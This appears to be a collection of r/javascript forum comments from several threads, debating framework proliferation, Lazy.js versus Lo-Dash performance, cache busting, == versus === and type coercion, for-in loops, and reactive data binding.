Exactly. That *is* the problem. And the point of the article was to highlight what should be done to be successful...in addition to saying that there are so many frameworks out there that come about because of the Not Invented Here syndrome. I am just as guilty of doing this in the past. And my trials/tribulations are what make me realize that. I'm not saying *don't* do it because that's what made me better at the JavaScript. I'm agreeing with what the article says: if you're going to do it, here are a couple points on how to do it *right*.
Any linechart library could do this, you just have to give it the right data points. 
I have a feeling you could make D3 do it - http://techslides.com/over-2000-d3-js-examples-and-demos/
@sps i CAN say there's a framework bloat out there... you CAN say the same. The folks whose mission is to review frameworks can NOT say it. Not in such a pompous, superiority complex kind of way. Whatever good was in the message was lost in the translation. And just noting, you didn't really answer my question. Where you ever bothered by the repetition? how? in what way? 
&gt; So here is my issue: I'd like to be able to use this jQuery Bracket Library with my WordPress site. That's not an issue, that's a desire. &gt; However, I'm not sure how I'd go about it [...] Thank you in advance for your time and help. It sounds like you haven't even tried to use it? If you have actually tried to use it, and failed, then post what you tried here and we can help you to fix it. But, if my sinking suspicion is correct, and you're just actually wanting someone to spit out a blob of JS that will magically do everything you want, then I'm afraid you've mistaken the purpose of this sub. This sub exists for those of us interested in JS to share news articles, discuss coding strategies and patterns, to review projects, and to give help when you get stuck trying to implement something. If you desire to learn JS, at least try first, then seek help. But if you have no desire to learn, then you'd be better off hiring a developer to actually code the stuff you want.
the choice of the title was unfortunate to say the least.
yeah, as a developer about to start looking for a new job, that article was a real confidence killer.
No, there's very definitely real money involved here. Having someone look at and/or click a link to your FB page (and/or real site) is worth a lot, when you consider the potentially millions of users that could be funneled in from an exploit like this. Even if you only get $0.001 per page impression, if you happen to exploit 1mil FB users then that's an easy $1000. Combine that $0.001 with multiple others, get a few more million suckers to click it, and you can easily walk away with $5-10k for doing basically nothing at all, and with virtually no risk at all (especially if you're in Eastern EU/Asia). Facts and figures are for example only, but that's the gist of it; someone's making an easy dime.
You aren't going to find what you want, no editors that I know of will read a 3rd Party's API and provide function dropdowns. You're most likely just going to have to memorize some API methods.
Thanks for the feedback! I'll take a look at the tutorials.
**JS autocomplete is hard.** It's hard because any variable can hold anything... *If* you have a documented API (JSdoc comments), and you *know* the type of a variable (from JSdoc comments, etc), or you can figure out what methods are available (if you write `var foo={bar:1};` you can be sure that `foo` has `bar`), then you can achieve something like intellisense. Maybe the best plugin is [ternjs](http://ternjs.net/). You still have to configure it to work properly, and it far from perfect, but it can resolve `require` (node) and `define` (requireJS) dependencies, so you *might* get some hints about the available API. It's available for Sublime Text, Vim, Emacs, and it's used by Bracket internally. The other way is to use a typed language, like TypeScript, Dart, etc. They can be compiled to JS.
Completion is good, remember the dark days of browser monopoly? Lazy.js is giving lo-dash a run for its money so all is well.
True
I was going to say pretty much exactly this. Not to mention, this is /r/javascript not /r/wordpress, and this is almost entirely a problem in the wordpress domain. For OP, http://mattgemmell.com/what-have-you-tried/
lmfao in retrospect, it really is so funny to see a spreadsheet described as an "excel-like app"
It is. React brings something substantially different to the table and is very focused in what it provides. I'm really glad I gave it another look after I initially didn't pay too much attention because of the (actually completely optional) inline XML feature.
What is this exactly?
Lazy.js is *only* faster if you're chaining multiple collection methods. For a single collection iteration I believe Lo-Dash will be faster.
Apparently it is not the case: there is a benchmark on the link (left side of it is single methods). Might be because Lazy.js doesn't have to assemble the output array.
Why not just update the requirejs config with the new file names for each module. http://requirejs.org/docs/api.html#config-paths It would be simple to put together a grunt task to output a new requirejs config after the fingerprinting process.
Sublime Text has a good plugin called SublimeCodeIntel that does autocomplete pretty well. It's not a true IDE, so to speak, but once you start using multiple cursors, it's hard to go back. Infinite free trial, nags you to buy it every like 20th time you save.
Completely agree with these being bad interview questions. Lists like this can be a starting point, but in my experiences interviewing people, it's best to tailor the interview to how your site uses JavaScript. Trick questions like these are for people who can't think of questions on their own and really wouldn't show what someone knows about the language apart from its idiosyncrasies. There's no point in having questions that trip someone up for the sake of tripping someone up. You should have questions that are easier and harder and pull from them as the interview goes on after getting a feel for what you need to probe further on. A better thing is a coding question that requires them to show use of common patterns in the language: loops, different data structure, prototypes, etc. and that they can talk you through their thought process. 
I'd give highcharts a go, it has so many options. The only thing to confirm is can it label both ends of the lines like that.
You forgot to check the "toArray" option instead of "each" on the benchmark page. Lo-Dash wins by a landslide for `map`, `filter`, `uniq`, `union`, and `shuffle`.
Comparing a platform that's in literally *every* internet connected device in the world to languages with niche cases such as prolog and vbscript is laughable to be honest. I'm not disagreeing with the fact that we're currently in a 'write everything and anything in JavaScript' phase, but I think it's more symptomatic of the push to the web rather than just a push to javascript itself. Until all the browser vendors unanimously agree on a replacement, and the entire world moves onto replacement supported products, JavaScript will be 'in' so to speak.
Haha, yea I'm aware of that. Even though executing this code outside of Facebooks scope will probably do nothing any (still won't risk it due to the XMLHttpRequest()). I was just pointing out that there was a syntax error. :) EDIT: On second look, the url for the XMLHttpRequest is a relative path. There's no way this would execute correctly if done in the console of another site.
I like the idea, however I'm confused why you wouldn't just modify the headers for the files to something like: Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate" Header set Pragma "no-cache" Header set Expires "Wed, 11 Jan 1984 05:00:00 GMT" 
Two way data binding is going to make you incur performance costs regardless of the size of the framework you choose. I'm not a big fan of using anything outside of backbone because I've found these larger frameworks just don't scale with truly complex html5 applications and are far too inflexible for the intricacies you run into while molding an app to your specific use cases. However, that all depends on what you are trying to do, I just can't speak to the merit of the ones you mentioned because of this perspective. That being said, I wanted to mention backbone.stickit which would give you exactly what you want while allowing you to leverage your existing skills without taking on a new monolithic framework: http://nytimes.github.io/backbone.stickit/
Remember to unbust when you go production. Nothing annoys a spider more than cache busters.
Does Lazy.js only work on `Array`s?
I'm writing my own language for this. The problem I have with all of these systems is that they only solve the problem of html view dependence on a model structure. The actual problem is much more generic than that. We often have one data structure dependent on another data structure. Sometimes it's a view dependent on a model. Sometimes the model is dependent on the properties of some other structure within the same model. If you think of a file system as a structure, then a build system can be thought of as an output structure dependent on the input source structure. ALL of these situations benefit from reactive dependencies, so I need a general solution for this problem and not just some html-based reactive templates.
Agreed, cache headers are the way to go.
That's fine for dev environments and staging, but not for production. 
&gt;Also, the fact that you think javascript is just a fad is laughable. What programming language hasn't been a fad in the history of languages? Everything was always going to be done in Cobol until C came around, then C++ supplanted C, then Java supplanted C++. Every website was written in Perl until it was all written in PHP, and then Ruby on Rails had a moment in the sun. Don't get me wrong, JS is awesome, but there's no reason to believe we've happened upon a steady state now that NodeJS has been in existence for all of four and a half years and webapps are popular. In five years, we might not be interacting with our devices through things as ancient as a "browser."
Anglular.js with ui-router would give you a reactive system with the ability to have multiple, nested or multiple nested named views all of which are reactive and can give you a pretty good frame work to build a reactive application where the view is rather complex and tightly bound to the data structure. If that sounds helpful I can link some good resources.
Signed up looking forward to the content :)
If starting from scratch, building a decent sized app, get everything you need with Ember, batteries included: http://emberjs.com/ - The forthcoming HTMLbars templates promise speed on par with all those reactive frameworks, with all the structured goodness of Ember on top of it.
Socket.io + handsontables with Angular JS would give you a pretty powerful combo, you can bind the handsontables data collection through angular and update it by having the socket.io event listeners update the angular scope object.
"it's by the ToDoMVC people" and that gives it merit? It's a site specifically targeted towards making it easier for people to evaluate which mvc framework to use. This entire post is flat out ignorant of how the Web came to be and harmful. The statement "... before open sourcing" in this article implies that people with existing javascript code should think twice before sharing code. This is a) ridiculous as client side javascript is open source by nature b) a slap in the face to everything this community stands for and the tenets it was built on and c) sounds like a statement from some engineer from the pre-mozilla era and that is just plain unattractive. As I said in a related post earlier: non native Web people talking about the Web like this === bad for everyone. The only thing you'd "lose" by evaluating more frameworks to choose the right one for your system is time and that cost is far less than important than the implications of stifling people for doing more to grow the Web. You'd also gain insight into different techniques by doing so as well as see what other developers opinions are on how apps should be structured (maybe... just maybe one could take the proliferation of frameworks to mean we haven't found the optimal solution to the problem yet?) . To put it bluntly even making that suggestion is no different than stating that restriction of speech/making statements of opinion is a good idea in any other aspect of spciety. That's not how the Web works and I'll be damned if that changes. There are plenty of more restrictive platforms where the hard decisions are made for you if that is what you want. Take those opinions to those platforms where they belong. This community is built solely on what you are arguing against (and I thought contributing to). Shame on you. 
This is probably a terrible solution but whenever I update a file, all the references to it are appended (using grunt-replace) with a random fixed-length string. So in my JS I have $.get("/file.@file.html" ... I then have a rewrite directive in my nginx server config. It turns requests for /file.H593FBZ9.html into /file.html.
The community is self regulating and that's the entire point. There are many tools to use (including github itself) to see what the most commonly used/adopted tools are. That is how we innovate. Maybe you weren't around to know but that's how jquery became jquery. It never would've happened if there hadn't been a cornucopia of frameworks vying to be the top in that slot. When you make statements like these guys did, if people listen, you'll lose things like jquery and the communities ability to choose/improve it organically. 
And if you propagate this ridiculous opinion people with really good solutions to offer with think twice and decide not to share it. This argument was lost and proven incorrect many years ago in this industry. 
I'll check it out. Thanks. Btw I did it using node.js and building a scrape server. It was pretty simple and fast.
By using Object.observe() you can have changes pushed to you. This is not yet fully supported, but there are shims, and it's the future basis for all reactive javascript.
Right, but why do you want the values pushed to you?
Horrible for performance. Having to re request alone is bad, but having to redownload also on every page load is even worse. 
Because otherwise you have to periodically check every single potential input value to look for changes. Also, it's more efficient when supported natively.
I'm not sure that it's meaningfully better from a performance perspective relative to the complexity you need to take on.
http://mgjmp.com/inv/35abpthaxgc4cvvc
We even have a Twitter if anyone's interested. :D Thanks for the mention, magenta! C:
Signed up!
Surely, it is better to understand: (a) the difference between === and ==, (b) what are the falsey values than blindly follow some "best practice". Personally, I use, by default, == except when needing to enforce exact comparison, because most of the time, that is all that is required. Know what you're comparing and use what you need.
I generally do the opposite, using === except in cases where I know implicit conversions are okay. Those are fairly rare in most of the code that I write. 
[See if this helps you](http://jsbin.com/AcaRuve/1/edit?html,js,output) 
The creators of JS should have made "==" mean what "===" means. Then they should have given us a different operator: ~=.{{=#=}}.=~ ...which means what == means.
Good points, although I mostly use Angular which doesn't rely on my code using prototypes. Their scopes use the prototype to fall back on parent scopes which to me is an excellent use of prototypes. Using prototypes heavily becomes a bit of a hassle because of Javascripts this-binding. That is, you can't pass a method as a function if that method relies on `this` unless you use .bind(). So the consumer of the object must know if the method can be used as a function, or if it must be called as a method. You can write some function that automatically binds all methods to the correct object before it's returned, but then you kinda loose the benefit of using prototypes. A lot of people think in objects, and for them it makes sense to structure an application around objects. I tend to prefer functions and closures over objects, but some people find it harder to navigate a code base with functions instead of objects.
The problem with your method is that, of you eg do not pay attention once and use your default operator, your code doesn't fail and show you an error, but it pretends to be working and then fails at some point later in time with the cause far more difficult to find.
I prefer to **always** use === and explicitly do coercion of values before comparing, if necesasry. That way, there's zero confusion for anyone reading the code.
This just seems paranoid to me, though. Like using === on a `typeof` check, which I see all the time. `typeof x === 'function'`. Neither of the things on either side of that comparison are ever going to be anything but strings. If you know what you're comparing, the extra = is just paranoia/dougma/noise.
As long as you polyfill IE7 and 8 if you support them.
 Will js minimzers or compilers rewrite the inefficient for in loop as a classic for loop? Or is that not a thing? 
If you want to hear an opposing view on JS "best practices", please check out [Angus Croll's "Break all the rules"](https://www.youtube.com/watch?v=MFtijdklZDo). tl;dr: know your language, make your own decisions. best practices are not a substitute for competence.
[Om](https://github.com/swannodette/om) &gt;Om allows users to represent their UIs simply as EDN. Because ClojureScript data is immutable data, Om can always rapidly re-render the UI from the root. Thus Om UIs are out of the box snapshotable and undoable and these operations have no implementation complexity and little overhead. Not traditional javascript per say, but I'm a big fan of clojure. Here's an [article](http://swannodette.github.io/2013/12/17/the-future-of-javascript-mvcs/) from the dev who made it.
They cannot as they don't know if you really added some custom properties that you want to iterate over two.
I think I may be a little confused by your wording. Since javascript isn't statically typed wouldn't they not need to know or care that you added a custom property? Simply by stating for(x in y) you are asserting that there may be an x in y. At runtime querying y for the property x isn't dependent on the knowledge that it is already there. Not saying you are wrong just looking for further clarification. 
I'm sorry i didn't mean to proclaim that they were inefficient versions of for loops, I was just using the comparison made in the article. I guess what I was drawing on is some examples from other languages. Things like the clang compiler can completely tear apart looped code and unravel it to behave in a more efficient fashion. To the point where the executing code looks little like the syntactic sugar originally written by the developer. Yet the end result is the same. So I was wondering if similar mechanisms were put in place for the less efficient for in loop in javascript. 
Or they could have made `==` do that `===` means, and nuked the old `==` from orbit.
&gt; This just seems paranoid to me, though. No, it's providing a meaning to the reader. `===` says that you want to precisely compare the two operands for strict equality and nothing else. `==` says "all bets are off". `==` has a significantly higher semantic overhead than `===`, and thus is much noisier when trying to understand the code.
Nice, good work sorting that out.
Found a random blog post putting numbers to help quantify by how much faster. http://benhollis.net/blog/2009/12/13/investigating-javascript-array-iteration-performance/
Let me know what you want to learn, I'll be recording the screencasts.
If you compare for-in with for with forEach, then you should also compare it to updating the GUI: [for loops vs innerHTML](http://jsperf.com/for-in-vs-for-vs-reduce-vs-foreach/8). There really isn't much point in optimizing the fastest part of your code.
How do you check against null/undefined?
But we can solve ignorance and incompetence by writing blogs about best practices and imposing rules upon how people should write their code! Right?
It seemed like the bigger problem was using for-in for an array rather than using == vs ===. All these things have their uses, using them incorrectly isn't really a failing of the language.
Not perfect, just perfectionist control-freak. It's an affliction as much as a blessing. ;)
Explicitly with `typeof` if I need to test for those cases specifically, but usually `if (foo)` is sufficient. Although in the context of the previous question: if (foo === null || typeof foo === 'undefined') { // foo is null or undefined }
`if (foo)` is very much type coercion. and it will be false for `false`, `0`, `''` etc. Seriously, it seems ridiculous to not just use `foo == null`. And the fact that many experienced js developers can't tell what that does just by looking at it, that's the damage that `===` does. It promotes ignorance of type coercion. 
That is true, and if I'm doing that then I know I'm testing against truthy values. That said, I believe we should always try to be as strict as possible within reason, so using === instead of == is generally a good thing, but doing something like: if (foo !== null &amp;&amp; typeof foo !== 'undefined' &amp;&amp; foo !== false &amp;&amp; foo !== 0 &amp;&amp; foo !== '0') { // foo is a truthy value } instead of just: if(foo) { // foo is a truthy value } is much less readable, and kind of pointless. So implied coercion is fine in some cases like the above, but when directly comparing two values against each other, I would argue that === is a better, more robust practice. Also, using == implies that you aren't sure of the type of your variables. If not, why the hell not? That said, I'm far from an expert, so I will no doubt be corrected by someone much smarter than me :)
&gt; typeof x === 'undefined' I see this particular check far more than the function check, actually
&gt; can't tell what that does just by looking at it this is the biggest problem in my eyes; At a glance you can't tell that it's a check for anything except *something* truthy
Why would I not be sure of the type of my variables? because that's a feature of a dynamically typed language, and this is javascript, not java. === won't give you static typing. Look, as long as you have a good understanding of how coercion works, and have a good understanding of how the types will coerce in a == statement, you should use whatever the hell you're comfortable with. Who am I to tell you what's a best practice? Who is *anyone*? The thing that gets my nickers in a knot is when people come along and promote *not even trying* to understand coercion, using === to remedy the ignorance that that creates. It will bite you somewhere else, and you will be totally unprepared. You can't just ignore core concepts of the language and hope everything will go ok.
Yes, it's an existential check, that's the whole point. It should not be hard to understand.
Don't get me wrong, understanding coercion is a good thing, and definitely something we should promote learning of. However, I don't agree that telling people to "just use whatever" is a good thing. == allows coercion to happen behind the scenes, which can easily lead to bugs. I have never encountered a situation where using == over === is preferable in JS.
and if `x` is `null`?
That's interesting. I wonder if it's confirmation bias because you are used to using === everywhere. Personally I run into useful cases for == every day. Also, I don't agree with telling *anybody* how to write their code. They should learn it, be competent, and make their own decisions. If they can't do that, javascript &amp; type coercion is not your problem.
It would be cool to see some examples of good use cases for == if you have any. It's not something I've ever encountered really, but as I said, I'm no expert :)
Sorry, my point was: if you ever make mistakes, be prepared for them. I would expect a perfectionist control-freak to prefer the use of ===, seeing as that immediately lets you know of potential errors and fix them, and to control exactly the type of data that comes in (which you often want). And there's no real disadvantage either.
`Object.prototype.toString.call(yourVar)` does the trick for me. I actually use the angular.is* functions now, but they do essentially the same thing. 
As already mentioned `val == null` is the most common one, as an existential check. One thing I've run into a few times: parsing values such as a numeric ID from a URL, when you've already passed the value through a route is another, since IDs (at least in my case) can't be 0. For example if you have `targetUserId` which has come from a URL or else where, so you don't know if it's a string or not, you can use coercion to skip the parsing: ``` var userComments = comments.filter(function(comment) { return comment.id == targetUserId }); ``` Other checks would be redundant because they will simply return an empty collection anyway. Otherwise, it's not so common that you have a scenario where you specifically rely on == to coerce something for you, it's just that when you really start looking at your code, strict comparison is just not necessary most of the time. So saying 'I'll just use it everywhere!' seems mad to me. 
Seriously? Seriously. Dude. `yourVar == null` don't fear the coercion, embrace it
If yourVar is the string 'null' that'll evaluate to true. 
How would the compiler differentiate between these two cases?: var obj; //Will eventually contain an array var otherObj; //Will eventually contain an object (key, value pairs) function loop(overMe, doThis){ for (var x in overMe){ doThis(x); } }; loop(obj); //Could be interchanged loop(otherObj); //Could not be interchanged The compiler cannot know whether it's safe to replace the loop because it doesn't know what it will receive. Add to that the ability to modify 'this' and arguments on the fly and there is no safe way to do this type of substitution.
You are wrong. &gt; var yourVar = 'null' undefined &gt; yourVar == null false
Ok, fair enough. I still use them for other type checking. 
Way too many undocumented secrets in that framework.
Sure thing it is slower just because it checks callback to be function, but even so you get hundreds of thousands operations per second (check http://jsperf.com/loooop-test). I don't think that it will become a bottleneck in complex application. Edit: grammar.
I've been playing with React as I like the generate-DOM-in-your-JavaScript approach generally and JSX solves one of its main issues in that hand-cranking nested function calls can be [unwieldy](https://github.com/insin/poker-league/blob/master/poker.js#L831-L937), while React allows you to write one render method and have updates taken care of without having to blow away huge chunks of the page. I've been meaning to dig into it since JSConfEU, with a view to eventually porting my both-sided projects (one of the reasons I generate DOM in code) to use it, as generating HTML is just a different function call and the same components on the client can then hook up events on page load.
As I understood you, you suggest auto-rewriting for-of loop into for(length) loop, right? In this case you will lose all non-numerical enumerable properties in the loop.
Great job, I see myself using this soon.
You can probably get most things done with gulp.
If you want a language without type coercion, try Dart or Ceylon. Personally, I don't really see the point of type coercion. It doesn't seem to simplify or improve anything. If there is string interpolation, that one use case is covered. Looks better, too: 'asdf ' + foo.bar() + ' ' + baz + ' ' + (3 + 4) 'asdf ${foo.bar()} $baz ${3 + 4}' (Ceylon uses double backticks for this.)
Basically I agree with you, but remember: what YAFS really means: stop and don't try to come with a new framework because... Labeling YAFS is putting a bad name on people to discourage them to come with new things. Why is that good? You know what happens with this kind of behavior when is encouraged by visible people (like TODOMVC project)? All sorts of dummy people will start to feel good about themselves by labeling others that learn, make a small good change around them, do some real work, etc. The only acceptable behavior is to criticize as much as you want on real issues but do not try to discourage people creating new things (broken, undocumented, or whatever). The only vote you have is to use or not a module, framework. Labeling people with bad names is not an option! 
labeling people is a sign of moral weakness that should be discouraged. Any stupid people can label others and feel good about how smart he is but decently smart people can't afford such broken behaviors..
I agree. I started writing a small library that only does DOM selection and event listening. I am going to, soon, add a way to do use the event listening API without using the DOM selection API. But that's all it does. Libraries don't have to be massive to be useful. I would rather use several small libraries that have the functionality that I want instead of using one massive one that has a ton of stuff I don't want. 
Oh my god, another pointless loop performance benchmark! Everyone should see this to understand why most of them are flawed (including the one in the article): http://www.youtube.com/watch?v=65-RbBwZQdU Also, as Mr. Egorov said, "often devs still approach performance of JS code as if they are riding a horse cart but the horse had long been replaced with fusion reactor"
Or maybe ~= 
singed up looking forward to the videos. 
Thank you for the link to this video. I hope to get the opportunity to watch it later today. Do you disagree that you should not iterate over arrays with for-in, or rely on type conversion?
Video looks very promising, and it's not one I've seen before.
The point is there's no *"you should not"*. The point is to learn your tools, make your own decisions, and trust other people to do the same. Personally, I don't use for-in, but I think it's ok to rely on type coercion if you know what you're doing.
how is if(foo) hard to understand?
Express is minimal?
The loop for (var x in obj) is not interchangeable with for (var i=0;i&lt;obj.length;i++) the former will loop through all the properties of obj while the latter will only loop through all the in order numerical properties. 
I agree about the language progression, but this is why we write testable code. No matter how you use == or ===, whatever the coding style, guild lines of your team. You still should be writing testable code. 
It's not Edit: I believe we're talking about different things. That third sentence is referring to `foo == null` and my meaning was that a competent javascript developer should easily be understand what that does.
This is true, however, I've found when developers move from writing code in the languages mentioned above to JS, they find writing testable code and tests more difficult (you need selenium, or phantom.js, etc to test many code paths), so they simply don't bother tests or testable code.
selenium is more like a recording tool. In my experience it is for integration or acceptance testing. Unit testable code in jasmine is not like selenium. I use jasmine, write unit tests against my javascript code (using angular as my gui framework). You have to commit to write unit testable code as a team, your team needs to understand concepts such as SOLID. You also need to commit to write unit test code in your server side code (in .NET, or php or Java) 
Oh, I think I misunderstood you.
I can't trust other people to do the same. In an organization with more than a few people there is typically widly varying skill sets and knowledge. I've had to work with Java developers turned JS developers just to finish up a feature before the deadline and heuristics like the ones in the article can be helpful. In any case, you provide an interesting perspective. My perspective is that most people I work with have no idea what they are doing, so I need to keep my code as dumb as possible.
I'm not sure what your alternative is. This is what you do with Object.observe: var object = {x:1,y:2}; var dependentSum; function updateSum() { dependentSum = object.x + object.y } updateSum() Object.observe(object, updateSum); now my language is fully reactive (unless you're writing a regular imperative function), so it is simpler to write: var object = {x:1,y:2} var dependentSum = object.x + object.y In both cases, the dependentSum is automatically kept up to date when the original object changes.
Well, the ability to unit test your code is made easier by frameworks that make testing easier. If you're writing code in Angularjs you can easily write unit tests for your code. If you're writing code with Dojo, the framework doesn't encourage a clean separation between widget and DOM manipulation, so the average developer is going to have a much more difficult time unit testing verse using something like selenium to do integration testing.
Totally agree, so it goes back to what I said: does your team value unit testable code? in the first place. Choosing a technology shouldn't just be a circlejerk from the dev team, you must be able to justify it for the business. 
... then (typeof x) gives "object"...?
Or we could just expect people to [read the documentation](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide)‚Ä¶ Knowing a language's operators isn't exactly advanced experience. It's JavaScript 101. If you aren't taking the time to learn a language's most basic syntax and behaviors, then it's your own fault when you shoot yourself in the foot.
Maybe they mean in terms of documentation?
Don't blindly change == to ===. There are legitimate use cases for ==, so don't just assume the original developer made a mistake by using it. In this case, I think the bigger mistake is that, elsewhere in the code, the array is having string properties added instead of proper numerical properties. But then this article completely ignored this problem and only focused on the for-in loop.
I started out learning Backbone, and stuck with it for a number of projects. I liked that it was lightweight, kept my code clean(er), and was easy to understand / modify with minimal OOJS knowledge. I looked into Angular, but the leaning curve seemed really steep for a dummy like me, so I kept putting off learning it. But at some point I had some simple CRUD app that looked like at most a two day project, so I made the decision to add Angular into the mix, just for the experience. It did add a lot of time to the project, as doing things 'the Angular way' wasn't a natural thing for me to transition into. Once I did finish though, I had a newfound appreciation for the framework. I have put together two other small apps since using Angular, and with each one I love it more. Once you get over the hump, and get a good feel for how the framework operates, you find that there is little it can't do. And because it is so modular, its really easy to pull parts from things you have done previously to drop into new projects, making each new project (for me at least) take less and less time to complete. Im sure smarter people than myself can go into more of the technical side of why it is or isn't a good choice, but for my part I will say that it's simply fun to develop on Angular, and takes a lot of the pain out of the process.
I'm not sure how many people are still looking at this thread, but Spectra was featured in DailyJS: http://dailyjs.com/2014/02/04/spectra-gizmo-edison Also, as a result, it's now the 13th trending repository for today. (2/5/2014) Thanks for all your help, and I hope Spectra helps you guys out in your own Javascript projects!
Maybe I need to simplify. Can someone tell me how to take a property from object1 and compare it with all properties in object2? (without using a million $.each())
Express docs are pretty good.
They're better than most node.js frameworks, but I was referring specifically to Sails' docs.
What is an object when you really break it down? It's a tree! All you need to do is recursively walk through the nodes, and detect if each leaf is an array or a value. If it's array check equality the way you normally would. If it's a primitive/string just check of they are equal (if it's an object you are not at a leaf and need to recurse again). I can also suggest some ways to Really simplify this if you are using underscore? I'll try to throw together a fiddle in a little bit here on the recursive method. In my phone right now. Edit: After looking more closely I am getting the feeling that what you are trying to do is not compare two objects. Your first object looks pretty "flat" (the inner objects properties have non-object values like strings) the while the second object has similar property names but the values are other objects which then contain properties with the values in object 1. Are you basically looking to look throughout object 2 to see if it contains the key/value pair from object 1 somewhere in its nested structure? Please clarify that part. 
You mean, like, actually understand what I'm doing? That sounds like a lot of effort.
It's amazing how much good convention saves you from these things. 
hadn't even heard of totaljs until your mention here. seems quite large/complete, surprising that it's ripped off (very lame)? which modules in particular? 
But you do mention things like an array being objecst and the fact that the "integers" you use to reference an index are actually simple object keys (something often used to make the opposing argument to your post) but go on to say you can't trust that people can't be trusted to not alter the Array . prototype... Where do you work? LOL, that is the sort of thing you should just flat out tell people No about and one time only. After that it's gross misconduct. One question for you: what about if you need to compare an integer value to a value pulled from a data attribute? (or what if you can't absolutely know the type of that value ahead of time). Also, are you also against existence checking like if(obj) and any use of the fact that things are truthy/falsey all together then? 
I've actually looked at Dart, briefly. Love it.
&gt;Countable is a JavaScript function to add live paragraph-, word- and character-counting to an HTML element. Countable is a zero-dependency library and comes in at 1KB when minified and gzipped. Say what? Essential tool? This looks like a joke.
[you might need to do a search in the subreddit to make sure you aren't reposting](http://www.reddit.com/r/javascript/comments/1wkm2b/you_might_not_need_jquery/)
Fuck list posts.
I'm not against if(obj) that seems pretty idiomatic to me, even if type conversion is happening. 
Pretty close yes. This is kind of confusing so bear with me....We are checking to see if Object 1 has a match value for an attribute in Object 2. If there is a match, we set the enabled attribute in the matched subObj, in Object 1, to TRUE. It gets a little more complicated when we have multiple entries in Object 2, as seen in the example. We would then need to match ALL values for it to be true. As in the example above where "Automotive" and "usable" must be true. There are cases where there would be multiple departments and in that case, the department match would be 'OR' instead of 'AND'. Such as ("Automotive" **OR** "HR") **AND** ("Usable"). For the above two qualifications, we need to go back over previously "enabled = true" subObjs and set any that don't meet the requirements to "enabled = false". I feel like the notation we have for Object 2 is not correct and could be optimized. 
This guy is working with me.
List of 20 Javascript Keywords Everyone Must Know 1) if 2) for 3) var 4) ... Kaaaarmaaa!
I actually questioned his "No Dependencies" spiel a long time ago, when it was partial, and he basically responded with absolute nonsense that demonstrated he didn't understand npm and declaring dependencies.
Why not: var object = {x: 1, y: 2} function getDependentSum() { return object.x + object.y; } And call getDependentSum() whenever you need it?
Ah. You could do that in this trivial example, but in real usage, the dependent object is not a primitive, but an actual structure. For instance, the dependent object could be an entire HTML Document Object Model graph. Or, the dependent structure could be an output folder as part of your reactive build process. The output is not just a functional value that you can call when you want it, it's a structure that must exist constantly and you want it to reactively and INCREMENTALLY update itself. If you were calling a function to render your DOM then you would have to recalculate and re-render the entire DOM for any change (or use some wicked complicated render logic like some approaches do). I could provide a more sophisticated example to convey this if you like.
I appreciate it. Thanks for taking the initiative!
window.onresize should be a function. You are setting window.onresize to the value that updateOnResize() returns (which is undefined since updateOnResize doesn't return anything.
Thanks. Though, why does it work when there's no parenthesis?
Makes me think of the perl regex matching operator
Because the parens cause the function to be invoked. Without the parens, `updateOnresize` is just a reference to the function with that name. So `window.onresize = updateOnresize` sets `window.onresize` to be a reference to the function named `updateOnresize`. With the parens you actually invoke the function thus setting `window.onresize` to be the return value of the function (which, as previously mentioned, is `undefined`).
Hey, I use ``grunt-hash`` to generate a map. hash: { options: { mapping: 'assets.json', srcBasePath: '&lt;%= globalConfig.dest %&gt;', destBasePath: '&lt;%= globalConfig.dest %&gt;' }, css: { src: '&lt;%= globalConfig.dest %&gt;/css-orig/main.css', dest: '&lt;%= globalConfig.dest %&gt;/css' }, js: { src: '&lt;%= globalConfig.dest %&gt;/js-orig/build/*.js', dest: '&lt;%= globalConfig.dest %&gt;/js' } }, The assets.json looks like this { "css-orig/main.css": "css/main.012ccd22.css", "js-orig/build/about.js": "js/about.fefb5707.js", "js-orig/build/blog.js": "js/blog.e7e975bf.js", "js-orig/build/browse-games.js": "js/browse-games.9ce839d0.js", "js-orig/build/browse-players.js": "js/browse-players.7521c21a.js", "js-orig/build/common.js": "js/common.aad36649.js", "js-orig/build/contact.js": "js/contact.94b24812.js", "js-orig/build/error404.js": "js/error404.5f94e6f3.js", "js-orig/build/feed.js": "js/feed.222a9e68.js", "js-orig/build/forgot.js": "js/forgot.c95f9fef.js", "js-orig/build/game-edit.js": "js/game-edit.9c71e447.js", "js-orig/build/game.js": "js/game.00a34620.js", "js-orig/build/home.js": "js/home.eea641e3.js", "js-orig/build/link.js": "js/link.8d746690.js", "js-orig/build/login.js": "js/login.74d8d8d9.js", "js-orig/build/profile-logged.js": "js/profile-logged.b1b52c27.js", "js-orig/build/profile.js": "js/profile.6f74705d.js", "js-orig/build/register.js": "js/register.b3202671.js", "js-orig/build/reset.js": "js/reset.f7795b1f.js", "js-orig/build/settings.js": "js/settings.21338220.js" } Since I use PHP, I wrote an asset manager that parse that files and output this: var require = { "baseUrl": "//js.myntimg.com/assets/js", "paths": { "about": "about.fefb5707", "blog": "blog.e7e975bf", "browse-games": "browse-games.9ce839d0", "browse-players": "browse-players.7521c21a", "common": "common.aad36649", "contact": "contact.94b24812", "error404": "error404.5f94e6f3", "feed": "feed.edb120a9", "forgot": "forgot.c95f9fef", "game-edit": "game-edit.9c71e447", "game": "game.00a34620", "home": "home.eea641e3", "link": "link.8d746690", "login": "login.74d8d8d9", "profile-logged": "profile-logged.b00db0ee", "profile": "profile.eb986325", "register": "register.b3202671", "reset": "reset.f7795b1f", "settings": "settings.21338220" } } And then I just include my requirejs with my optimized javascripts. It's used here: http://player.me. If you need more info or help, tell me! I can share my full code or something. 
Having done this a while ago (in a different a lang) I'd say don't waste your time. They're not even close to accurate to real time. Just saying.
I'm currently learning the very recent [Vue.js](vuejs.org) which is basically the "View" from Angular. It's 30kb, which was for me one of its main pros (React is said to be the shit but weights 100kb).
The "fanboi effect" mostly.
Can you elaborate? As far as I know, spiders doesn't care about js or css.. 
I find that if I'm constantly typing the same words in a name it's probably because they need to be grouped together in an object... ie: viewModel.selectUserRoles, viewModel.selectRoleEditor JavaScript is made of objects... use them.
Object.observe() only works on shallow objects though, right? If you use my approach then memoization is an appropriate optimization since all of your dependency tracking is expressed as functional computations.
Shocked that some of these made the list. Shocked that Hapi.js did not.
